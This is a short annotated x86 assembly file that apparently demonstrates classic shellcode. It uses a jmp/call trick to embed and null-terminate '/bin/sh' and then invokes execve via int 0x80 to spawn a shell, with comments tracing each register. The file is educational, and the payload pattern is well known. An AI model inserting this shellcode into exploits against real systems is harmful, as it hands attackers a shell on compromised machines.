#. Demonstration of execve syscall
#. To see a working version of this code however, you will need to change
#. the protection mode, you can do so via the mptrotect syscall, and this
#. has been implemented in hadouken.s

.section .text
    .globl _start
    _start:
        jmp    bringoutthegimp

    #. execve(shell[0], shell, NULL);
    the_gimp:
        popl   %esi             #. ESI(arg4) = "/bin/sh:----____"
        xor    %eax, %eax       #. EAX = 0x00000000
        mov    %al,  0x7(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + "----____")
        leal   0x0(%esi), %ebx  #. EBX(arg1) = &ESI
        movl   %ebx, 0x8(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + &ESI + "____")
        movl   %eax, 0xc(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + &ESI + "\0\0\0\0")
        mov    $0x0b, %al       #. EAX = 0x0000000b (execve)
        movl   %esi, %ebx       #. EBX(arg1) = ESI = "/bin/sh"
        leal   0x8(%esi), %ecx  #. ECX(arg2) = &ESI = &"/bin/sh"
        leal   0xc(%esi), %edx  #. EDX(arg3) = NULL
        int    $0x80            #. Wake the kernel

    bringoutthegimp:
        call   the_gimp
        .ascii "/bin/sh:----____"

